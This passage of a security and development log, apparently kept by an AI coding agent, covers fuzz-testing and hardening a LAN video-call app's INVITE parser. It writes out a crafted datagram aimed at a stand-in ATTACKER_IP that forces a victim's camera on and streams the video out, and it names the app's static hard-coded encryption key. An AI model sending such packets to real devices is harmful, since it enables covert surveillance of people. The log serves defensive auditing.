  wrong-magic / negative-lookalike IPs.
- **VERIFIED robust: same PID before/after, NO crash.** The parser is bounds-safe by construction — every index
  is guarded (`n >= 2`, `n > 2 ?`, `parts.count > 1/2`), invalid UTF-8 -> "" (`String(bytes:) ?? ""`), 512B buf
  truncates oversize. The idle recv loop already handles EAGAIN (SO_RCVTIMEO). After the barrage a VALID INVITE
  still rang correctly -> listener not wedged.
- **FINDING (spam-hardening, not a crash): a 2-byte magic-only datagram makes the Mac RING** "TRI-NET
  (127.0.0.1)" — any LAN host can pop the incoming-call UI, and while ringing (40s) the `incomingCall == nil`
  guard makes it IGNORE legitimate INVITEs. Also lucky-ordering shielded the 200-IP auto-join flood (the first
  garbage ring set incomingCall, blocking the rest). Left UNCHANGED: requiring a minimal valid payload before
  ringing is a policy/behavior call on Codex-edited CallManager; reported as an option. The app is SAFE (no
  crash) — this is annoyance-DoS, not memory-unsafety.
- **Pattern: fuzz any plaintext/unauthenticated parser that faces the network, live, and assert the PROCESS
  survives (same PID) + the service still works afterward — reading "looks bounds-safe" is not proof.**

## WAVE 2026-07-22 #13 — iOS INVITE parser verified by equivalence + spam-ring HARDENED (both platforms)

- **iOS idle INVITE parser is bounds-safe by STRUCTURAL EQUIVALENCE to the fuzzed Mac parser.** Read
  ViewModel.swift startIdleListener line-by-line vs CallManager's: identical guards (`n<=0`->EAGAIN-continue,
  `n>=2`+magic, `n>2 ? String(bytes: buf[2..<n]) ?? "" : ""`, `parts.count>1/2`, 512B buf). Same guards -> the
  56-datagram Mac fuzz (no crash) transfers. Can't live-fuzz a phone headlessly; equivalence is the honest proof.
- **FIXED the cross-platform spam-ring (both platforms):** added `guard !participants.isEmpty else { continue }`
  right after parsing participants. A REAL INVITE always carries `[myIP] + hosts` (>=1), so this rejects the
  2-byte-magic / empty-field spam that let any LAN host pop the incoming-call UI (and block real INVITEs for
  40s), while changing NO legitimate behavior. Verified LIVE: 5 no-participant spam datagrams -> 0 rings (was
  ringing "TRI-NET"), a valid INVITE -> 1 ring. Minimal + clearly-correct (not a policy judgment), so done
  autonomously; the harder "well-formed-but-fake INVITE still rings + blocks 40s" is left as a separate note.

## WAVE 2026-07-22 #14 — SECURITY: unauthenticated forced-camera exfiltration via group INVITE (CONFIRMED live)

- **SERIOUS privacy vuln, verified live.** The idle INVITE listener auto-joins ANY 3+ participant INVITE
  (`participants.count > 2 -> acceptIncoming()`) with NO user Accept. `acceptIncoming` builds the call targets
  from `inc.participants` — the ATTACKER-CONTROLLED IP list in the plaintext INVITE — and `startCall()` turns on
  the camera and fans out video to them, sealed with a STATIC conference key
  (`HKDF("tri-net-psk-v1", "conference", "group-aead")`) baked into every app instance.
- **Exploit chain (LAN):** attacker sends `[FD 11] "x\nVICTIM,ATTACKER_IP,z\nEVILROOM"` to victim:7000 ->
  victim auto-joins (room need NOT match — the count>2 arm bypasses the room check) -> victim's camera turns ON
  and streams to ATTACKER_IP under the known static key -> attacker decrypts and watches. Zero interaction.
  Verified: crafted packet produced `auto-joining group from attacker` -> `accepting call -> mesh back to
  …192.168.1.240,241,242` -> `captureOutput first frame` -> `encoder 1280x720 @ 900kbps`.
- **NOT fixed autonomously — it is a security/UX architecture decision the USER must own.** Every fix changes
  the tested "call from Mac -> both iPhones just join" flow: (a) require room-match for auto-join (breaks
  empty-room deployments); (b) gate on the caller being a discovered roster peer (resolveIP is ASYNC, no clean
  sync check; and a LAN attacker running the app is still "discovered"); (c) never auto-join, always ring
  (loses the UX); (d) ROOT FIX — derive the group key from a per-room/enrollment shared secret instead of a
  static baked PSK, and/or authenticate the INVITE, so an outsider can neither trigger nor decrypt. Reported
  with the menu; the user picks the trade-off. Both platforms share this code path (Mac CallManager + iOS
  ViewModel).
- **Lesson: an "auto-accept for convenience" path on an UNAUTHENTICATED plaintext trigger is a camera/mic
  exfiltration primitive. Audit every auto-action reachable from the network for a caller-authentication gate.**
